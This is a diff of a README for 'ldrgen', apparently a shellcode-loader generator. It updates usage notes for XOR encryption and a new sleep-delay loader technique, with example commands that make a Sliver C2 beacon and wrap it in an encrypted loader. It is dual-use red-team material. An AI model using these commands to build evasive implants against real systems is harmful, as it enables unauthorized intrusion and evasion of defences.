@@ -33,9 +33,11 @@ go build -o ldr .
 ```
 
 ## Usage with Encrypted Shellcode
-If you intend to use encrypted payload, `ldrgen` can perform XOR encryption of the binfile for you by specifying the `-enc` and `-key` flags when running the tool. This operation creates a temporary file "shellcode.bin.enc" in your current working directory. Specify `--cleanup` to delete this file afterwards.
+If you intend to use encrypted payload, `ldrgen` can perform XOR encryption of the binfile for you by specifying the `-enc` and passing in a key to the `-args` flag when running the tool. 
 
-Make sure to specify a loader token that supports encryption, some are: `inline_xor`, `createthread_xor`
+This operation creates a temporary file "shellcode.bin.enc" in your current working directory. Specify `--cleanup` to delete this file afterwards.
+
+Make sure to specify a loader token that supports encryption, some are: `inline_xor`, `createthread_xor`, `createthread_xor_sleep`.
 
 ## Example (calc.exe)
 ```bash
@@ -49,18 +51,20 @@ cd output && make x64
 ```bash
 sliver > generate beacon --http <listener_ip> --format shellcode
 ```
-![shellcode_gen](./assets/126b19d26d4e3af6573a5f5bc2802f84.png)
+![shellcode_gen](./assets/dc6d223050e1f9a8000f18fd517ead02.png)
 
 ### Loader Generation
 ```bash
-./ldr -bin SEMANTIC_CUPOLA.bin -out output -ldr CreateThread_Xor -enc xor -key aahduiahsdgiasudhagsdashdasgjdhka --cleanup
+./ldr -bin QUALIFIED_HONESTY.bin -out ./output -ldr CreateThread_Xor_Sleep -enc xor -args "key=supersecretkey1234, sleep=5" --cleanup
 ```
-![ldr_gen_1](./assets/b48b971be9df335205f1d3f7a9c768d4.png)
-- binfile -> **SEMANTIC_CUPOLA.bin**
+![ldr_gen_1](./assets/2b606522c402139b1fd360978178e1d5.png)
+- binfile -> **QUALIFIED_HONESTY.BIN**
 - output to -> **./output**
-- use technique -> **CreateThread**
+- use technique -> **CreateThread_Xor_Sleep**
 - with encryption: **xor**
-- with key: **aahduiahsdgiasudhagsdashdasgjdhka**
+- with args:
+    - key: **supersecretkey1234**
+    - sleep: **5**
 - delete tempfiles after compilation: **true**
 
 ### Compilation
